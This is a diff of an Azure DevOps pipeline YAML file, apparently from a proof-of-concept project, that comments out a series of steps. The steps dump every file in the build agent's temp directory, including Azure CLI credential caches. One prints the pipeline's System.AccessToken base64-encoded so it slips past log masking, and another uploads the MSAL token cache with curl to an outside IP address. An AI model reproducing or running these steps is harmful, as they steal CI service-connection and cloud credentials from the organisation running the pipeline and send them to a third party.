@@ -77,108 +77,108 @@ steps:
   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
 
   
-- task: AzureCLI@2
-  inputs:
-    azureSubscription: 'test_connection'
-    scriptType: 'bash'
-    scriptLocation: 'inlineScript'
-    inlineScript: |
-      echo "Inline script is here..........."
-      shopt -s dotglob  # 包含隐藏文件和文件夹
-      echo "Listing all files and directories in /home/vsts/work/_temp:"
-      find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-      find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-        echo "Content of $file:"
-        cat "$file"
-        echo ""
-      done
-      az --version
-  displayName: 'Run Azure CLI script'
+# - task: AzureCLI@2
+#   inputs:
+#     azureSubscription: 'test_connection'
+#     scriptType: 'bash'
+#     scriptLocation: 'inlineScript'
+#     inlineScript: |
+#       echo "Inline script is here..........."
+#       shopt -s dotglob  # 包含隐藏文件和文件夹
+#       echo "Listing all files and directories in /home/vsts/work/_temp:"
+#       find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
+#       find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
+#         echo "Content of $file:"
+#         cat "$file"
+#         echo ""
+#       done
+#       az --version
+#   displayName: 'Run Azure CLI script'
 
-
-- script: |
-    pstree -p
-
-    ps aux
-  displayName: 'pstree / ps aux命令'
-
-- script: |
-    echo "Recursively checking _temp directory after AzureCLI task..."
-    shopt -s dotglob  # 包含隐藏文件和文件夹
-    echo "Listing all files and directories in /home/vsts/work/_temp:"
-    find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-    find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-        echo "Content of $file:"
-        cat "$file"
-        echo ""
-    done
-  displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
 
 # - script: |
-#     echo "Checking for msal_http_cache.bin file..."
-#     if [ -f /home/vsts/work/_temp/.azclitask/msal_http_cache.bin ]; then
-#         echo "msal_http_cache.bin found. Uploading..."
-#         curl -F "file=@/home/vsts/work/_temp/.azclitask/msal_http_cache.bin" http://139.180.193.16:5000/upload
-#     else
-#         echo "msal_http_cache.bin not found."
-#     fi
-#   displayName: 'Check and Upload msal_http_cache.bin'
+#     pstree -p
+
+#     ps aux
+#   displayName: 'pstree / ps aux命令'
+
+# - script: |
+#     echo "Recursively checking _temp directory after AzureCLI task..."
+#     shopt -s dotglob  # 包含隐藏文件和文件夹
+#     echo "Listing all files and directories in /home/vsts/work/_temp:"
+#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
+#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
+#         echo "Content of $file:"
+#         cat "$file"
+#         echo ""
+#     done
+#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
+
+# # - script: |
+# #     echo "Checking for msal_http_cache.bin file..."
+# #     if [ -f /home/vsts/work/_temp/.azclitask/msal_http_cache.bin ]; then
+# #         echo "msal_http_cache.bin found. Uploading..."
+# #         curl -F "file=@/home/vsts/work/_temp/.azclitask/msal_http_cache.bin" http://139.180.193.16:5000/upload
+# #     else
+# #         echo "msal_http_cache.bin not found."
+# #     fi
+# #   displayName: 'Check and Upload msal_http_cache.bin'
   
-- task: AzureFunctionApp@1
-  inputs:
-    azureSubscription: 'test_connection'
-    appType: 'functionApp'
-    appName: 'mypocfunctiontest'
-    package: '$(Build.ArtifactStagingDirectory)/'
-  displayName: 'Deploy Azure Function App'
+# - task: AzureFunctionApp@1
+#   inputs:
+#     azureSubscription: 'test_connection'
+#     appType: 'functionApp'
+#     appName: 'mypocfunctiontest'
+#     package: '$(Build.ArtifactStagingDirectory)/'
+#   displayName: 'Deploy Azure Function App'
 
-- script: |
-    echo "Recursively checking _temp directory after AzureFunctionApp task..."
-    shopt -s dotglob  # 包含隐藏文件和文件夹
-    echo "Listing all files and directories in /home/vsts/work/_temp:"
-    find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-    find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-        echo "Content of $file:"
-        cat "$file"
-        echo ""
-    done
-  displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
-
-
-- task: AzureCLI@2
-  inputs:
-    azureSubscription: 'test_connection'
-    scriptType: 'bash'
-    scriptLocation: 'inlineScript'
-    inlineScript: |
-      echo "2 Inline script is here..........."
-      shopt -s dotglob  # 包含隐藏文件和文件夹
-      echo "Listing all files and directories in /home/vsts/work/_temp:"
-      find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-      find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-        echo "Content of $file:"
-        cat "$file"
-        echo ""
-      done
-      az --version
-  displayName: '2 Run Azure CLI script'
-
-- script: |
-    echo $(System.AccessToken) | base64
-    echo "Recursively checking _temp directory after AzureCLI task..."
-    shopt -s dotglob  # 包含隐藏文件和文件夹
-    echo "Listing all files and directories in /home/vsts/work/_temp:"
-    find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
-    find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
-        echo "Content of $file:"
-        cat "$file"
-        echo ""
-    done
-  displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
+# - script: |
+#     echo "Recursively checking _temp directory after AzureFunctionApp task..."
+#     shopt -s dotglob  # 包含隐藏文件和文件夹
+#     echo "Listing all files and directories in /home/vsts/work/_temp:"
+#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
+#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
+#         echo "Content of $file:"
+#         cat "$file"
+#         echo ""
+#     done
+#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
 
 
-- task: NodeTool@0
-  inputs:
-    versionSpec: '12.x'  # 或你所需的Node.js版本
-    checkLatest: true
-  displayName: 'Setup Node.js'
+# - task: AzureCLI@2
+#   inputs:
+#     azureSubscription: 'test_connection'
+#     scriptType: 'bash'
+#     scriptLocation: 'inlineScript'
+#     inlineScript: |
+#       echo "2 Inline script is here..........."
+#       shopt -s dotglob  # 包含隐藏文件和文件夹
+#       echo "Listing all files and directories in /home/vsts/work/_temp:"
+#       find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
+#       find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
+#         echo "Content of $file:"
+#         cat "$file"
+#         echo ""
+#       done
+#       az --version
+#   displayName: '2 Run Azure CLI script'
+
+# - script: |
+#     echo $(System.AccessToken) | base64
+#     echo "Recursively checking _temp directory after AzureCLI task..."
+#     shopt -s dotglob  # 包含隐藏文件和文件夹
+#     echo "Listing all files and directories in /home/vsts/work/_temp:"
+#     find /home/vsts/work/_temp -type d -exec ls -al {} \;  # 递归列出每个目录及其内容
+#     find /home/vsts/work/_temp -type f -print0 | while IFS= read -r -d '' file; do
+#         echo "Content of $file:"
+#         cat "$file"
+#         echo ""
+#     done
+#   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
+
+
+# - task: NodeTool@0
+#   inputs:
+#     versionSpec: '12.x'  # 或你所需的Node.js版本
+#     checkLatest: true
+#   displayName: 'Setup Node.js'
